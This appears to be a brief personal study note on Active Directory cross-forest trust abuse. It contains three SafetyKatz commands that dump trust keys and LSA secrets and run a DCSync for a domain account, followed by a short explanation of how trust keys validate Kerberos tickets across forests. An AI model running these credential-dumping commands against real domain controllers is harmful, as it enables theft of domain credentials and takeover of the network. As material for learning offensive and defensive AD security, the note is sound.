### Abuse


```powershell
SafetyKatz.exe "lsadump::evasive-trust /patch"

SafetyKatz.exe "lsadump::evasive-dcsync /user:dcorp\mcorp$" "exit"

SafetyKatz.exe "lsadump::lsa /patch"
```




> [!NOTE] **NOTE**
> Same as cross domain trust functionality, where the trusting DC only checks if it can decrypt the ticket using the **Trust Key** that both DCs have

![[Pasted image 20250519115856.png]]
### Cross Forest Kerberos Functionality
![[Pasted image 20250519115832.png]]